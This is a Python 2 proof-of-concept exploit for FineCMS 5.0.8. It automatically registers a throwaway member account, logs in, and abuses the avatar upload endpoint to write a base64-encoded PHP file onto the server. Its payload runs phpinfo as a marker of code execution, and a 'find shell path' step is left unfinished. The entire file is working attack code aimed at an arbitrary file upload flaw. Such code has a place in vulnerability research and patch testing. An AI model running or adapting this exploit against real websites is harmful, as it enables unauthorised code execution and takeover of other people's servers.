#Finecms version:5.0.8
#Author:404notfound

import random
import sys
import requests
def poc(url):
    username=random.randint(0,999999)
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    email = []
    for i in range(8):
        email.append(random.choice(seed))
    email = ''.join(email)
    #print email+"@"+email+".com"
    #print username
    
    #step 1 register
    #print "[+] register user"
    register_url=url+"/index.php?s=member&c=register&m=index"
    register_payload={"back":"","data[username]":username,"data[password]":"123456","data[password2]":"123456","data[email]":email+"@"+email+".com"}
    #step 2 login
    #print "[+] user login"
    login_url=url+"/index.php?s=member&c=login&m=index"
    login_payload={"back":"","data[username]":username,"data[password]":"123456","data[auto]":"1"}
    #step 3 attack
    #print "[+] loading payload"
    vul_url=url+"/index.php?s=member&c=account&m=upload"
    vul_payload={"tx":"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4="}
    try:
        s = requests.session()
        resu=s.post(register_url,data=register_payload)
        result=s.post(login_url,data=login_payload)
        result2=s.post(vul_url,data=vul_payload).content
        if "status" in result2:
            return True
        else:
            return False
    except Exception,e:
        pass
        #print e
    #print "[+] ALL DONE"
    #step 4 find shell path
       
#print poc("http://localhost")
        
